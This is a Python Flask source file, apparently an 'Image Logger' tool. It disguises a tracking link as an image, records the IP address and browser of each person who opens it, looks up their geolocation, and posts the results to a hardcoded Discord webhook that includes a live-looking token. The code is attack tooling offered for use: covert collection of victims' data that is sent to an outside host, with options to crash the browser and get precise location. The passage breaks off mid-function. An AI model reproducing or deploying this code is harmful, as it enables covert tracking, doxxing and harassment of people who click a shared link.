from flask import Flask, request, Response
import os
import requests
import base64
import httpagentparser
from urllib import parse

app = Flask(__name__)

CONFIG = {
    "webhook": "https://discord.com/api/webhooks/1375994522236092609/chsF4GUgXi0xyz5c78oPjsDoeQ_vlM6u4LrKi3XQEQysHE_5pFR2neshBl3A1FMiV1Ua",
    "image": "https://tenor.com/view/rovakook-gif-25331069",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

BLACKLISTED_IPS = ("27", "104", "143", "164")
BINARIES = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}

def _bot_check(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return None

def _report_error(error):
    payload = {
        "username": CONFIG["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": CONFIG["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    }
    try:
        requests.post(CONFIG["webhook"], json=payload, timeout=5)
    except requests.RequestException:
        pass

def _get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857",
            timeout=5
        )
        return response.json() if response.status_code == 200 else {}
    except requests.RequestException:
        return {}

def _make_report(ip, useragent, coords=None, endpoint="N/A", url=None):
    if ip.startswith(BLACKLISTED_IPS):
        return None

    bot = _bot_check(ip, useragent)
    if bot and CONFIG["linkAlerts"]:
        payload = {
            "username": CONFIG["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": CONFIG["color"],
                    "description": f"An **Image Logging** link was sent!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }
        try:
            requests.post(CONFIG["webhook"], json=payload, timeout=5)
        except requests.RequestException:
            pass
        return None

    info = _get_ip_info(ip)
    if not info:
        return None

    ping = "@everyone"
    if info.get("proxy") and CONFIG["vpnCheck"] == 2:
        return
